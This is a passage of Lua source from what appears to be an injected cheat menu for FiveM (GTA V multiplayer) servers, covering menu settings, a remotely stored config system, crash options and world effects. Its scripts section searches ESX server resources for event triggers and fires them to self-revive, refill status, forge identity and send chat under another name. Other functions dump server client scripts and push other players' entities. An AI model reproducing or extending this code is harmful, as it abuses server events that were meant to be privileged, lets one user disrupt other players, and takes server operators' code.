                    for k,v in pairs(__REAPER1__.T.VisBlips) do
                        __REAPER1__.N.RemoveBlip(v)
                    end

                    __REAPER1__.T.VisBlips = {}
                end,
            },
            textesp = {
                info = function(p1, p2, p3, p4, p5, p6, p7)
                    p6[p4] = not p6[p4]
                    __REAPER1__.F.AddNotification(p6[p4] and 'Added ' .. string.lower(p2[p4]) or 'Removed ' .. string.lower(p2[p4]), 3000, 0, 170, 10)
                end,
            }
        },
        settings = {
            reset = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.A['settings_scrollspeed'].cindex, __REAPER1__.A['settings_scrollspeed'].sindex = 100, 100
                __REAPER1__.A['settings_switchspeed'].cindex, __REAPER1__.A['settings_switchspeed'].sindex = 70, 70
                __REAPER1__.A['settings_lastoption'].func = true
                __REAPER1__.A['settings_infobox'].func = true
                __REAPER1__.A['settings_notifications'].func = true
                __REAPER1__.A['settings_images'].func = true
                __REAPER1__.A['settings_playerdata'].func = true
                __REAPER1__.A['settings_comboslider'].func = true

                __REAPER1__.A['settings_textbox'].func, __REAPER1__.A['settings_textbox'].extra = 'x', 56
                __REAPER1__.A['settings_bind'].fun, __REAPER1__.A['settings_bind'].extra = 'F10', 95
                __REAPER1__.A['settings_cursor'].func, __REAPER1__.A['settings_cursor'].extra = 'g', 39

                __REAPER1__.A['settings_positionx'].cindex, __REAPER1__.A['settings_positionx'].sindex = 102, 102
                __REAPER1__.A['settings_positiony'].cindex, __REAPER1__.A['settings_positiony'].sindex = 302, 302
                __REAPER1__.A['settings_widthx'].cindex, __REAPER1__.A['settings_widthx'].sindex = 195, 195
                __REAPER1__.A['settings_widthy'].cindex, __REAPER1__.A['settings_widthy'].sindex = 402, 402

                __REAPER1__.A['settings_defaultsounds'].func = true
                __REAPER1__.A['settings_bindingsounds'].func = true

                __REAPER1__.F.AddNotification('Menu settings reset.', 8000, 0, 170, 10)
            end,
            destroy = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.DestroyElCams()
                __REAPER1__.N.DestroyDui(__REAPER1__.M.BannerImage)
                __REAPER1__.N.DestroyDui(__REAPER1__.M.WeaponImage)
                __REAPER1__.N.DestroyDui(__REAPER1__.M.ModelImage)
                __REAPER1__.N.DestroyDui(__REAPER1__.M.NotifyImage)
                __REAPER1__.N.DestroyDui(__REAPER1__.M.BonetagImage)
                __REAPER1__.N.DestroyDui(__REAPER1__.M.VehicleImage)
                __REAPER1__.N.DestroyDui(__REAPER1__.M.Arrow1)
                __REAPER1__.N.DestroyDui(__REAPER1__.M.Arrow2)
                __REAPER1__.N.DestroyDui(__REAPER1__.M.Subm)
                __REAPER1__.N.DestroyDui(__REAPER1__.M.Entry)
                __REAPER1__.N.DestroyDui(__REAPER1__.M.Entry2)
                __REAPER1__.N.DestroyDui(__REAPER1__.M.Sepa)
                __REAPER1__.N.DestroyDui(__REAPER1__.M.SepaR)
                __REAPER1__.N.DestroyDui(__REAPER1__.M.Infobox)
                __REAPER1__.N.DestroyDui(__REAPER1__.M.PlyInfobox)
                __REAPER1__.N.DestroyDui(__REAPER1__.M.Subm2)
                __REAPER1__.N.DestroyDui(__REAPER1__.M.Subm3)
                __REAPER1__.N.DestroyDui(__REAPER1__.M.Subm4)
                __REAPER1__.N.DestroyDui(__REAPER1__.M.Subm5)
                __REAPER1__.N.DestroyDui(__REAPER1__.V.CustomSound)
                if __REAPER1__.V.Cham then __REAPER1__.N.DestroyDui(__REAPER1__.V.Cham) end
                if __REAPER1__.V.WCham then __REAPER1__.N.DestroyDui(__REAPER1__.V.WCham) end

                __REAPER28__(__REAPER1__.E.EventResoStart)
                __REAPER28__(__REAPER1__.E.EventResoStop)
                __REAPER1__.M.ActiveTick = false
                __REAPER1__ = nil
            end,
            streamer = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    local ret = __REAPER1__.F.TextBox('', nil, 'altalanos', 'vegyes', 3, 'Are you sure? Yes or No')

                    if ret == 'Yes' then
                        __REAPER1__.M.StreamerMode = true
                        __REAPER1__.N.DrawRect = function() end
                        __REAPER1__.N.DrawSprite = function() end
                        __REAPER1__.F.DrawText = function() end
                    end
                end)
            end,
            banner = function(p1, p2, p3, p4, p5, p6, p7)
                if string.len(p2) > 1 then
                    __REAPER1__.N.SetDuiUrl(__REAPER1__.M.BannerImage, p2)
                else
                    __REAPER1__.F.AddNotification('Invalid image url.', 5000, 255, 215, 0)
                end
            end,
            forcequit = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.RestartGame()
            end,
            forcecrash = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    local ret = __REAPER1__.F.TextBox('', nil, 'altalanos', 'vegyes', 3, 'Are you sure you want to crash? (Yes or No)')
                    if string.lower(ret) == "yes" then
                        if p4 == 1 then
                            __REAPER1__.N.DeleteEntity(__REAPER1__.V.SelfPed)
                        elseif p4 == 2 then
                            for i = 1, 1000 do
                                local asd = __REAPER1__.N.CreateDui('about:blank', 1000, 1000)
                                __REAPER1__.N.CreateRuntimeTextureFromDuiHandle(__REAPER1__.N.CreateRuntimeTxd(tostring(i + math.random(20, 40))), tostring(i + i + math.random(1, 90)), __REAPER1__.N.GetDuiHandle(asd))
                            end
                        elseif p4 == 3 then
                            while true do end
                        elseif p4 == 4 then
                            for i = 1, 10000 do
                                for j = 1, 10000 do
                                    for k = 1, 10000 do
                                    end
                                end
                            end
                        end
                    end
                end)
            end,
            language = {
                language = function(p1, p2, p3, p4, p5, p6, p7)
                    for _k,_v in pairs(__REAPER1__.T.Display) do
                        for k,v in ipairs(_v) do
                            for x,d in pairs(__REAPER1__.T.Languages[p6]) do
                                if string.lower(v.text) == string.lower(x) then
                                    __REAPER1__.T.Display[_k][k].text = d
                                end
                            end
                        end
                    end
                end,
            },
            config = {
                save = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        local ret = p2 or __REAPER1__.F.TextBox('', nil, 'altalanos', 'vegyes', 30, 'Config name')
                        if ret then
                            local t = {}

                            for _k,_v in pairs(__REAPER1__.T.Display) do
                                if not string.find(_k, "configs", 1, true) and (not string.find(_k, "weapon", 1, true) and _k ~= 'weapon:weapon' and _k ~= 'weapon:modifier' and _k ~= 'weapon:entitygun' and _k ~= 'weapon:ammo' and _k ~= 'weapon:debuggun') and
                                _k ~= 'server:onlineplayers' and _k ~= 'searchopt' and _k ~= 'scripts:dumper' and _k ~= 'vehicle:handling' and not string.find(_k, "Ma1sj87/%", 1, true) and not string.find(_k, "91b72Ag=", 1, true) and not string.find(_k, "targetinglist", 1, true) and #_k > 0 then
                                    for k,v in ipairs(_v) do
                                        if v.dkey then
                                            local t2 = nil
                                            if v.option == __REAPER1__.M.Combo and (v.sindex > 1 or v.toggle == true) then
                                                t2 = {d = v.dkey, s = v.sindex}
                                                if v.toggle == true then t2.b = true end
                                            elseif v.option == __REAPER1__.M.Button_Textbox or (v.option == __REAPER1__.M.Checkbox and v.func == true) then
                                                t2 = {d = v.dkey, f = v.func}
                                                if v.tipus == 'bind' then t2.k = true end
                                            elseif v.hkey ~= nil then
                                                t2 = {d = v.dkey}
                                            end

                                            if t2 then
                                                if v.hkey ~= nil then t2.h = v.hkey t2.n = v.hkeynum end
                                                if v.menuextra then t2.m = v.menuextra end
                                                if v.extra then t2.e = v.extra end
                                                if v.extra2 then t2.l = v.extra2 end

                                                table.insert(t, t2)
                                            end
                                        end
                                    end
                                end
                            end

                            __REAPER1__.F.WebSave(ret, t, 4000, true)

                            if not p3 then
                                if __REAPER1__.T.Display['settings:configs'][4] == nil then
                                    __REAPER1__.T.Display['settings:configs'][4] = {text = 'Configs', option = __REAPER1__.M.Separator}
                                    local dkey = 'settings:configs:' .. ret .. 5
                                    local t = {text = ret, dkey = dkey, desc = ret .. ' config menu.', option = __REAPER1__.M.Menu_Button, func = {'settings:configs', dkey}, lasto = 1, scrollo = 0, addedo = 0}
                                    __REAPER1__.T.Display['settings:configs'][5] = t
                                    __REAPER1__.A[dkey] = t
                                    
                                    __REAPER1__.T.Display[dkey] = {
                                        {text = 'Load', dkey = dkey .. '_load', desc = 'Load this config.', afu = __REAPER1__.M.settings.config.load, option = __REAPER1__.M.Button, extra = dkey},
                                        {text = 'Delete', dkey = dkey .. '_delete', desc = 'Delete this config.', afu = __REAPER1__.M.settings.config.delete, option = __REAPER1__.M.Button, extra = dkey},
                                        {text = 'Override', dkey = dkey .. '_override', desc = 'Override this config with your current\nsettings.', afu = __REAPER1__.M.settings.config.override, option = __REAPER1__.M.Button, extra = dkey},
                                        {text = 'Rename', dkey = dkey .. '_rename', desc = 'Rename this config.', afu = __REAPER1__.M.settings.config.rename, option = __REAPER1__.M.Button, extra = dkey},
                                    }
                                else
                                    local dkey = 'settings:configs:' .. ret .. #__REAPER1__.T.Display['settings:configs']
                                    local t = {text = ret, dkey = dkey, desc = ret .. ' config menu.', option = __REAPER1__.M.Menu_Button, func = {'settings:configs', dkey}, lasto = 1, scrollo = 0, addedo = 0}
                                    table.insert(__REAPER1__.T.Display['settings:configs'], t)
                                    __REAPER1__.A[dkey] = t
                                    
                                    __REAPER1__.T.Display[dkey] = {
                                        {text = 'Load', dkey = dkey .. '_load', desc = 'Load this config.', afu = __REAPER1__.M.settings.config.load, option = __REAPER1__.M.Button, extra = dkey},
                                        {text = 'Delete', dkey = dkey .. '_delete', desc = 'Delete this config.', afu = __REAPER1__.M.settings.config.delete, option = __REAPER1__.M.Button, extra = dkey},
                                        {text = 'Override', dkey = dkey .. '_override', desc = 'Override this config with your current\nsettings.', afu = __REAPER1__.M.settings.config.override, option = __REAPER1__.M.Button, extra = dkey},
                                        {text = 'Rename', dkey = dkey .. '_rename', desc = 'Rename this config.', afu = __REAPER1__.M.settings.config.rename, option = __REAPER1__.M.Button, extra = dkey},
                                    }
                                end

                                __REAPER1__.F.AddNotification('Saved config: ' .. ret, 5000, 0, 170, 10)
                            end
                        end
                    end)
                end,
                load = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        local t, kret, cfg = nil, nil, nil
                        if p6 then
                            cfg = __REAPER1__.A[p6].text
                            local ret = Ham.GETRequest([[https://host19.phl.hu/mentes3.php?usr=]]..Ham.getName()..[[&cfg=]]..cfg..[[&val=&append=]], 'host19.phl.hu', 443, true)
                            t = json.decode(ret)
                        else
                            kret = __REAPER1__.F.TextBox('', nil, 'altalanos', 'vegyes', 30, 'New config name')
                            if kret then
                                local a1, a2 = string.find(kret, "_", 1, true)
                                if a1 then
                                    local ret = Ham.GETRequest([[https://host19.phl.hu/mentes3.php?usr=]]..string.sub(kret, 0, a1 - 1)..[[&cfg=]]..string.sub(kret, a1 + 1, #kret)..[[&val=&append=]], 'host19.phl.hu', 443, true)
                                    t = json.decode(ret)
                                    kret = string.sub(kret, a1 + 1, #kret)
                                end
                            end
                        end

                        if t == nil then
                            Ham.GETRequest([[https://host19.phl.hu/mentes3.php?usr=]]..Ham.getName()..[[&cfg=]]..(kret or cfg)..[[&del=1]], 'host19.phl.hu', 443, true)

                            __REAPER1__.F.AddNotification('Invalid config: ' .. (kret or cfg or 'None'), 5000, 255, 0, 0)
                            if cfg then
                                __REAPER1__.F.DeleteConfigTab('settings:configs', p6, 5)
                            end
                            return
                        end

                        __REAPER1__.T.KeysHam['binds'] = {}

                        __REAPER1__.N.DestroyElCams()

                        for _k,_v in pairs(__REAPER1__.T.Display) do
                            if not string.find(_k, "configs", 1, true) and (not string.find(_k, "weapon", 1, true) and _k ~= 'weapon:weapon' and _k ~= 'weapon:modifier' and _k ~= 'weapon:entitygun' and _k ~= 'weapon:ammo' and _k ~= 'weapon:debuggun') and
                            _k ~= 'server:onlineplayers' and _k ~= 'searchopt' and _k ~= 'scripts:dumper' and not string.find(_k, "Ma1sj87/%", 1, true) and not string.find(_k, "91b72Ag=", 1, true) and not string.find(_k, "targetinglist", 1, true) then
                                for k,v in ipairs(_v) do
                                    if v.hkey then
                                        v.hkey, v.hkeynum = nil, nil
                                    end

                                    if v.option == __REAPER1__.M.Checkbox and v.func then
                                        v.func = false
                                    elseif v.option == __REAPER1__.M.Combo then
                                        v.cindex, v.sindex = 1, 1

                                        if v.toggle == true then
                                            v.toggle = false
                                        end
                                    end
                                end
                            end
                        end

                        for _k,_v in pairs(__REAPER1__.T.Display) do
                            if not string.find(_k, "configs", 1, true) and (not string.find(_k, "weapon", 1, true) and _k ~= 'weapon:weapon' and _k ~= 'weapon:modifier' and _k ~= 'weapon:entitygun' and _k ~= 'weapon:ammo' and _k ~= 'weapon:debuggun') and
                            _k ~= 'server:onlineplayers' and _k ~= 'searchopt' and _k ~= 'scripts:dumper' and not string.find(_k, "Ma1sj87/%", 1, true) and not string.find(_k, "91b72Ag=", 1, true) and not string.find(_k, "targetinglist", 1, true) then
                                for k,v in ipairs(_v) do
                                    for x,d in ipairs(t) do
                                        if v.dkey == d.d then
                                            if d.m ~= nil and v.menuextra ~= d.m then v.menuextra = d.m end
                                            if d.e ~= nil and v.extra ~= d.e then v.extra = d.e end
                                            if d.l ~= nil and v.extra2 ~= d.l then v.extra2 = d.l end
                                            if d.n ~= nil and v.hkeynum ~= d.n then v.hkeynum = d.n end
                                            if d.h ~= nil and v.hkey ~= d.h then v.hkey = d.h end

                                            
                                            if d.f ~= nil and d.f ~= v.func then
                                                v.func = d.f
                                                if v.afu then v.afu(v.dkey, v.func, v.cindex, v.sindex, v.toggle, v.extra, v.extra2) end
                                            end
                                            if d.s ~= nil and d.s ~= v.sindex and d.d ~= 'visuals:textesp_information' then
                                                v.cindex, v.sindex = d.s, d.s
                                                if v.afu then v.afu(v.dkey, v.func, v.cindex, v.sindex, v.toggle, v.extra, v.extra2) end
                                            end
                                            if d.b ~= nil and v.toggle ~= d.b then
                                                v.toggle = d.b
                                                if v.afu then v.afu(v.dkey, v.func, v.cindex, v.sindex, v.toggle, v.extra, v.extra2) end
                                            end

                                            if d.k and d.e or d.n and d.h then
                                                local skip = false
                                                for k1,v1 in ipairs(__REAPER1__.T.KeysHam['binds']) do
                                                    for _k1,_v1 in ipairs(v1.dkeys) do
                                                        if v.dkey == _v1 then
                                                            if #v1.dkeys == 1 then
                                                                table.remove(__REAPER1__.T.KeysHam['binds'], k1)
                                                            else
                                                                table.remove(__REAPER1__.T.KeysHam['binds'][k1].dkeys, _k1)
                                                            end
                                                            break
                                                        end
                                                    end
                                                end
                        
                                                for k1,v1 in ipairs(__REAPER1__.T.KeysHam['binds']) do
                                                    if v1.key == (d.k and d.e or d.n) then
                                                        skip = true
                                                        table.insert(v1.dkeys, v1.dkey)
                                                    end
                                                end
                        
                                                if not skip then
                                                    table.insert(__REAPER1__.T.KeysHam['binds'], {key = (d.k and d.e or d.n), dkeys = {v.dkey}})
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end

                        if kret then
                            __REAPER1__.M.settings.config.save(nil, kret)
                        end

                        __REAPER1__.F.AddNotification('Loaded config: ' .. (kret or cfg), 5000, 0, 170, 10)
                    end)
                end,
                delete = function(p1, p2, p3, p4, p5, p6, p7)
                    local cfg = __REAPER1__.A[p6].text
                    Ham.GETRequest([[https://host19.phl.hu/mentes3.php?usr=]]..Ham.getName()..[[&cfg=]]..cfg..[[&del=1]], 'host19.phl.hu', 443, true)

                    __REAPER1__.F.DeleteConfigTab('settings:configs', p6, 5)
                    __REAPER1__.F.AddNotification('Deleted config: ' .. cfg, 5000, 0, 170, 10)
                end,
                override = function(p1, p2, p3, p4, p5, p6, p7)
                    local cfg = __REAPER1__.A[p6].text
                    Ham.GETRequest([[https://host19.phl.hu/mentes3.php?usr=]]..Ham.getName()..[[&cfg=]]..cfg..[[&del=1]], 'host19.phl.hu', 443, true)

                    __REAPER1__.M.settings.config.save(nil, cfg, true)

                    __REAPER1__.F.AddNotification('Overriding config: ' .. cfg, 5000, 0, 170, 10)
                end,
                rename = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        local ret = __REAPER1__.F.TextBox('', nil, 'altalanos', 'vegyes', 30, 'New config name')
                        if ret then
                            local cfgn = __REAPER1__.A[p6].text
                            local cfg = Ham.GETRequest([[https://host19.phl.hu/mentes3.php?usr=]]..Ham.getName()..[[&cfg=]]..cfgn..[[&val=&append=]], 'host19.phl.hu', 443, true)

                            __REAPER1__.F.WebSave(ret, json.decode(cfg), 4000)

                            local dkey = 'settings:configs:' .. ret .. #__REAPER1__.T.Display['settings:configs'] - 1
                            local t = {text = ret, dkey = dkey, desc = ret .. ' config menu.', option = __REAPER1__.M.Menu_Button, func = {'settings:configs', dkey}, lasto = 1, scrollo = 0, addedo = 0}
                            table.insert(__REAPER1__.T.Display['settings:configs'], t)
                            __REAPER1__.A[dkey] = t
                            
                            __REAPER1__.T.Display[dkey] = {
                                {text = 'Load', dkey = dkey .. '_load', desc = 'Load this config.', afu = __REAPER1__.M.settings.config.load, option = __REAPER1__.M.Button, extra = dkey},
                                {text = 'Delete', dkey = dkey .. '_delete', desc = 'Delete this config.', afu = __REAPER1__.M.settings.config.delete, option = __REAPER1__.M.Button, extra = dkey},
                                {text = 'Override', dkey = dkey .. '_override', desc = 'Override this config with your current\nsettings.', afu = __REAPER1__.M.settings.config.override, option = __REAPER1__.M.Button, extra = dkey},
                                {text = 'Rename', dkey = dkey .. '_rename', desc = 'Rename this config.', afu = __REAPER1__.M.settings.config.rename, option = __REAPER1__.M.Button, extra = dkey},
                            }

                            if __REAPER1__.M.CurrentMenu == p6 then
                                __REAPER1__.F.SetMenu(p6, dkey)
                            end

                            for k,v in ipairs(__REAPER1__.T.Display['settings:configs']) do
                                if v.dkey == p6 then
                                    table.remove(__REAPER1__.T.Display['settings:configs'], k)
                                    break
                                end
                            end

                            Ham.GETRequest([[https://host19.phl.hu/mentes3.php?usr=]]..Ham.getName()..[[&cfg=]]..cfgn..[[&del=1]], 'host19.phl.hu', 443, true)

                            __REAPER1__.F.AddNotification('Renamed config: ' .. cfgn .. '. To: ' .. ret, 5000, 0, 170, 10)
                        end
                    end)
                end
            },
        },
        scripts = {
            sendmsg = function(p1, p2, p3, p4, p5, p6, p7)
                if __REAPER1__.V.TriggerChat then
                    local r, g, b = __REAPER1__.F.MenuExtra('scripts_color')
                    __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerChat, __REAPER1__.A['scripts_username'].func, {r, g, b}, __REAPER1__.A['scripts_message'].func)
                else
                    __REAPER1__.V.TriggerChat = __REAPER1__.F.DynamicTrigger('chat', 'TriggerServerEvent', 'GetPlayerName%(')
                end
            end,
            chatc = function(p1, p2, p3, p4, p5, p6, p7)
                if not __REAPER1__.V.TriggerChat then
                    __REAPER1__.V.TriggerChat = __REAPER1__.F.DynamicTrigger('chat', 'TriggerServerEvent', 'GetPlayerName%(')
                end
            end,
            dumper = {
                dump = function(p1, p2, p3, p4, p5, p6, p7)
                    if p6 and p7 then
                        print(' <<<< ' .. p7 .. ' >>>> :\n' .. p6)
                        __REAPER1__.F.AddNotification([[Search for script & file name. Dump location: ]], 10000, 200, 200, 200)
                        __REAPER1__.F.AddNotification([[AppData\Local\FiveM\FiveM.app\logs]], 10000, 200, 200, 200)
                    end
                end,
            },
            esx = {
                revive = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerRevive then
                        __REAPER1__.N.TriggerEvent(__REAPER1__.V.TriggerRevive)
                    else
                        __REAPER1__.V.TriggerRevive = __REAPER1__.F.DynamicTrigger('esx_ambulancejob', 'AddEventHandler', 'RespawnPed%(playerPed')
                    end
                end,
                refillstatus = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerHunger then
                        if p4 == 1 then
                            __REAPER1__.N.TriggerEvent(__REAPER1__.V.TriggerHunger, 'hunger', 1000000)
                            __REAPER1__.N.TriggerEvent(__REAPER1__.V.TriggerHunger, 'thirst', 1000000)
                        elseif p4 == 2 then
                            __REAPER1__.N.TriggerEvent(__REAPER1__.V.TriggerHunger, 'hunger', 1000000)
                        else
                            __REAPER1__.N.TriggerEvent(__REAPER1__.V.TriggerHunger, 'thirst', 1000000)
                        end
                    else
                        __REAPER1__.V.TriggerHunger = __REAPER1__.F.DynamicTrigger('esx_status', 'AddEventHandler', 'TriggerServerEvent%(')
                    end
                end,
                saveoutfit = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerSkinMenuSave then
                        __REAPER1__.N.TriggerEvent(__REAPER1__.V.TriggerSkinMenuSave)
                    else
                        __REAPER1__.V.TriggerSkinMenuSave = __REAPER1__.F.DynamicTrigger('esx_skin', 'AddEventHandler', 'TriggerServerEvent%(')
                    end
                end,
                outfitmenu = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerSkinMenu then
                        __REAPER1__.N.TriggerEvent(__REAPER1__.V.TriggerSkinMenu)
                    else
                        __REAPER1__.V.TriggerSkinMenu = __REAPER1__.F.DynamicTrigger('esx_skin', 'AddEventHandler', 'OpenSaveableMenu%(')
                    end
                end,
                identity = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerIdentity then
                        __REAPER25__(function()
                            if __REAPER1__.F.LoadEsx() then
                                local fname, lname, birth, sex, height = __REAPER1__.F.AdvStringSplit(5, p2, ' ')
                                __REAPER1__.T.ESX.TriggerServerCallback(__REAPER1__.V.TriggerIdentity, function(callback)
                                end, {firstname = fname, lastname = lname, dateofbirth = birth, sex = sex, height = height})
                            end
                        end)
                    else
                        __REAPER1__.V.TriggerIdentity = __REAPER1__.F.DynamicTrigger('esx_identity', 'TriggerServerCallback%(', "TriggerServerCallback%(")
                    end
                end,
            },
            bots = {
                commserv = function(p1, p2, p3, p4, p5, p6, p7)
                    if not p2 then
                        __REAPER1__.N.ClearPedTasks(__REAPER1__.V.SelfPed)
                        __REAPER1__.V.CommServStrikes, __REAPER1__.V.UpdatedCommCoords, __REAPER1__.V.CommServCoord, __REAPER1__.V.CommDelayBefore, __REAPER1__.V.CommDelayAfter = nil, nil, nil, nil, nil
                    end
                end,
                updateloc = function(p1, p2, p3, p4, p5, p6, p7)
                    if not __REAPER1__.V.CommServLocsUpdated then
                        local file = __REAPER1__.N.LoadResourceFile('esx_communityservice', 'config.lua')
                        if file then
                            __REAPER1__.T.CommServLocs = {}
                            for k,v in ipairs(__REAPER1__.F.StringSplit(file, "\n")) do
                                if string.match(v, 'Config.Uniforms') then
                                    break
                                end
    
                                if __REAPER1__.V.CommServS1 then
                                    table.insert(__REAPER1__.T.CommServLocs, v)
                                end
    
                                if string.match(v, 'Config.ServiceLocations') then
                                    __REAPER1__.V.CommServS1 = true
                                end
                            end
                            
                            table.remove(__REAPER1__.T.CommServLocs, #__REAPER1__.T.CommServLocs)
                            __REAPER1__.F.AddNotification('Updated locations.', 5000, 0, 170, 10)
                            __REAPER1__.V.CommServLocsUpdated = true
                        else
                            __REAPER1__.F.AddNotification('Resource couldn\'t be found.', 5000, 255, 0, 0)
                        end
                    end
                end,
            },
            commands = {
                register = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.RegisterCommand(p2, function(source, args, rawCommand) end, false)
                end,
                execute = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.ExecuteCommand(p6)
                end,
            }
        },
        world = {
            meteor = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function() __REAPER1__.F.RequestEntity(`prop_asteroid_01`) end)
            end,
            gravity = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetGravityLevel(p4 - 1)
            end,
            cweather = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.ClearOverrideWeather()
                __REAPER1__.N.ClearWeatherTypePersist()
            end,
            snow = function(p1, p2, p3, p4, p5, p6, p7)
                if not p2 then
                    __REAPER1__.N.ForceSnowPass(p2)
                    __REAPER1__.N.SetForceVehicleTrails(p2)
                    __REAPER1__.N.SetForcePedFootstepsTracks(p2)
                end
            end,
            rain = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetRainLevel(p2[p4])
            end,
            time = {
                freeze = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.V.ClockH, __REAPER1__.V.ClockM, __REAPER1__.V.ClockS = __REAPER1__.N.GetClockHours(), __REAPER1__.N.GetClockMinutes(), __REAPER1__.N.GetClockSeconds()
                end,
                day = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetClockDate(p4, __REAPER1__.N.GetClockMonth(), __REAPER1__.N.GetClockYear())
                end,
                month = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetClockDate(__REAPER1__.N.GetClockDayOfMonth(), p4, __REAPER1__.N.GetClockYear())
                end,
                year = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetClockDate(__REAPER1__.N.GetClockDayOfMonth(), __REAPER1__.N.GetClockMonth(), p2)
                end,
                displaytime = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.AddNotification('Time: ' .. __REAPER1__.N.GetClockHours() .. ' : ' .. __REAPER1__.N.GetClockMinutes() ..  ' : ' .. __REAPER1__.N.GetClockSeconds(), 10000, 255, 255, 255)
                end,
                displaydate = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.AddNotification('Date: ' .. __REAPER1__.N.GetClockYear() .. ' / ' .. __REAPER1__.N.GetClockMonth() .. ' / ' .. __REAPER1__.N.GetClockDayOfMonth(), 10000, 255, 255, 255)
                end,
            },
            modelchange = {
                change = function(p1, p2, p3, p4, p5, p6, p7)
                    local c = __REAPER1__.A['world:modelchange_origin'].sindex == 1 and vector3(0, 0, 0) or __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
                    __REAPER1__.N.ModelChange(c.x, c.y, c.z, __REAPER1__.A['world:modelchange_radius'].toggle and __REAPER1__.F.IntToFloat(__REAPER1__.A['world:modelchange_radius'].sindex) or 10000000000000000000000000000.0, __REAPER1__.N.GetHashKey(__REAPER1__.A['world:modelchange_originalobj'].func), __REAPER1__.N.GetHashKey(__REAPER1__.A['world:modelchange_newobj'].func), false) --prop_alien_egg_01
                end,
            },
            blackmagic = {
                blackhole = function(p1, p2, p3, p4, p5, p6, p7)
                    if not p2 and __REAPER1__.A['world:blackmagic_pushwhenoff'].func and (__REAPER1__.A['world:blackmagic_pedestrians'].func or __REAPER1__.A['world:blackmagic_vehicles'].func) then
                        local camrot = __REAPER1__.N.GetFinalRenderedCamRot(2)
                        local strength = __REAPER1__.A['world:blackmagic_strength'].sindex
                        local dx, dy, dz = -(math.sin(math.rad(camrot.z)) * strength * 10), math.cos(math.rad(camrot.z)) * strength * 10, strength * (camrot.x * 0.2)

                        if __REAPER1__.A['world:blackmagic_pedestrians'].func then
                            for k,v in pairs(__REAPER1__.N.GameTable('CPed')) do
                                __REAPER25__(function()
                                    if v ~= __REAPER1__.V.SelfPed and __REAPER1__.F.NetControl(v) then
                                        __REAPER1__.N.ApplyForceToEntity(v, 3, dx, dy, dz, 0, 0, 0, false, false, true, true, false, true)
                                    end
                                end)
                            end
                        end

                        if __REAPER1__.A['world:blackmagic_vehicles'].func then
                            for k,v in pairs(__REAPER1__.N.GameTable('CVehicle')) do
                                __REAPER25__(function()
                                    if (not __REAPER1__.N.IsPedInAnyVehicle(__REAPER1__.V.SeflPed) or v ~= __REAPER1__.N.GetVehiclePedIsIn(__REAPER1__.V.SelfPed)) and __REAPER1__.F.NetControl(v) then
                                        __REAPER1__.N.ApplyForceToEntity(v, 3, dx, dy, dz, 0, 0, 0, false, false, true, true, false, true)
                                    end
                                end)
                            end
                        end
                    end
                end,
                pos = function(p1, p2, p3, p4, p5, p6, p7)
                    local x, y, z = __REAPER1__.F.AdvStringSplit(3, p2, ' ', true)
                    __REAPER1__.V.BlackholePos = vector3(x, y, z)
                end,
                bself = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.V.BlackholePos = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
                end,
            },
            hover = {
                delete = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.DeleteEntity(__REAPER1__.V.HoverEnt)
                end,
                heading = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        if __REAPER1__.F.NetControl(__REAPER1__.V.HoverEnt) then
                            __REAPER1__.N.SetEntityHeading(__REAPER1__.V.HoverEnt, p4 - 1)
                        end
                    end)
                end,
                coords = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        if __REAPER1__.F.NetControl(__REAPER1__.V.HoverEnt) then
                            local x, y, z = __REAPER1__.F.AdvStringSplit(3, p2, ' ', true)
                            __REAPER1__.N.SetEntityCoordsNoOffset(__REAPER1__.V.HoverEnt, x, y, z, true, true, true)
                        end
                    end)
                end,
                invisible = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        if __REAPER1__.F.NetControl(__REAPER1__.V.HoverEnt) then
                            __REAPER1__.N.SetEntityVisible(__REAPER1__.V.HoverEnt, not p2)
                        end
                    end)
                end,
                godded = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        if __REAPER1__.F.NetControl(__REAPER1__.V.HoverEnt) then
                            __REAPER1__.N.SetEntityInvincible(__REAPER1__.V.HoverEnt, p2)
                        end
                    end)
                end,
                freeze = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        if __REAPER1__.F.NetControl(__REAPER1__.V.HoverEnt) then
                            __REAPER1__.N.FreezeEntityPosition(__REAPER1__.V.HoverEnt, p2)
                        end
                    end)
                end,
                nocollision = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
